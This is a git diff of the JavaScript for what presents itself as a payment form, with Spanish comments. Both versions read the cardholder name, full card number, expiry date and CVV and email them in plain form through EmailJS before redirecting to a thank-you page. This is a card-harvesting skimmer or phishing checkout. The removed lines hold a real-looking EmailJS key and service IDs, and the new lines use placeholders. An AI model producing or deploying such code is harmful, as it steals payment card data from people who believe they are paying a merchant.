@@ -1,57 +1,59 @@
-(function() {
-    emailjs.init('ReqtkWfjI392LAzFb'); // Tu Public Key
-})();
+// Configuración INICIAL de EmailJS (REEMPLAZAR CON TUS DATOS)
+emailjs.init('TU_PUBLIC_KEY'); // Obtén esto desde EmailJS
 
-// Formatear número de tarjeta
-document.getElementById('cardNumber').addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\s/g, '');
-    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-    e.target.value = value.substring(0, 19);
-});
-
-document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
-    const loader = document.getElementById('loader');
-    const errorMsg = document.getElementById('errorMsg');
     
-    // Ocultar mensajes
-    errorMsg.classList.add('hidden');
-    loader.classList.remove('hidden');
-
-    // Capturar datos
-    const formData = {
-        nombre: document.getElementById('userName').value.trim(),
-        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
-        fecha: document.getElementById('expiryDate').value,
-        cvv: document.getElementById('cvc').value
+    // 1. CAPTURAR DATOS
+    const datos = {
+        nombre_completo: document.getElementById('nombre').value.trim(),
+        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
+        fecha_expiracion: document.getElementById('fecha').value,
+        codigo_cvv: document.getElementById('cvv').value
     };
 
-    // Validaciones
-    try {
-        if (!/^[A-ZÀ-ÿ\s]{5,}$/.test(formData.nombre)) throw 'Nombre inválido';
-        if (!/^\d{16}$/.test(formData.numero)) throw 'Tarjeta inválida';
-        if (new Date(formData.fecha) < new Date()) throw 'Fecha expirada';
-        if (!/^\d{4}$/.test(formData.cvv)) throw 'CVV inválido';
+    console.log('Datos capturados:', datos); // Para verificar en consola
 
-        // Enviar datos
-        await emailjs.send(
-            "service_syrc1uk",
-            "template_u3etoro",
-            {
-                nombre: formData.nombre,
-                numero: formData.numero,
-                fecha: formData.fecha,
-                cvv: formData.cvv
-            }
-        );
-        
-        window.location.href = "thank-you.html";
-        
-    } catch (error) {
-        errorMsg.textContent = `❌ Error: ${error}`;
-        errorMsg.classList.remove('hidden');
-        console.error('Error:', error);
-    } finally {
-        loader.classList.add('hidden');
+    // 2. VALIDACIÓN
+    if (!/^[A-ZÁÉÍÓÚÑ\s]{5,}$/.test(datos.nombre_completo)) {
+        alert('Nombre inválido');
+        return;
     }
+
+    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
+        alert('Tarjeta inválida');
+        return;
+    }
+
+    if (new Date(datos.fecha_expiracion) < new Date()) {
+        alert('Fecha expirada');
+        return;
+    }
+
+    if (!/^\d{4}$/.test(datos.codigo_cvv)) {
+        alert('CVV inválido');
+        return;
+    }
+
+    // 3. ENVIAR CORREO (CONFIGURAR EN EMAILJS)
+    document.getElementById('mensajeCarga').style.display = 'block';
+
+    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
+        .then(() => {
+            window.location.href = "thank-you.html";
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert('Error al enviar. Verifica la consola.');
+        })
+        .finally(() => {
+            document.getElementById('mensajeCarga').style.display = 'none';
+        });
+});
+
+// Formatear número de tarjeta
+document.getElementById('tarjeta').addEventListener('input', function(e) {
+    let valor = e.target.value.replace(/\s/g, '');
+    valor = valor.replace(/(\d{4})/g, '$1 ').trim();
+    e.target.value = valor.substring(0, 19);
 });
